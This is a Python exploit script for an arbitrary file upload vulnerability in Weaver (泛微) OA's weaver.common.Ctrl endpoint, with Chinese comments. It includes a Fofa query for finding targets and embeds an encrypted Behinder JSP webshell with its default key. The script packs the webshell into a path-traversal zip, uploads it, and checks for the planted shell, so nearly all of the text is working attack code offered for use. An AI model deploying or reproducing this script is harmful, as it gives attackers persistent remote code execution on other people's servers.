# -*- coding: utf-8 -*-
# 泛微OA weaver.common.Ctrl 任意文件上传
# Fofa:  app="泛微-协同办公OA"

import zipfile
import sys
import requests
import time
from bs4 import BeautifulSoup 

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def file_zip(mm, webshell_name2):
    shell = """<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    """  ## 替换shell内容
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def GetShell(urllist):
    mm = 'GyBtVQDJ'
    webshell_name1 = mm + '.jsp'
    webshell_name2 = '../../../' + webshell_name1

    file_zip(mm, webshell_name2)
    urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    success_msg = now_time() + '[SUCCESS]利用成功'
    warning_msg = now_time() + '[WARNING]不存在Weaver_Common_Ctrl_Upload漏洞'
    error_msg = now_time() + '[Weaver_Common_Ctrl_Upload漏洞][ERROR]目标请求失败'
    try:
        requests.post(url=urls, files=file, timeout=10, verify=False)
        GetShellurl = urllist + 'cloudstore/' + webshell_name1
        GetShelllist = requests.get(url=GetShellurl, timeout=10, verify=False)
        shell_msg = now_time() + '默认冰蝎webshell地址为: "+ GetShellurl'
        if GetShelllist.status_code == 200:
            return success_msg,shell 
            return 'ok'
        else:
            return warning_msg
    except:
        return error_msg 


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    GetShell(target_url)


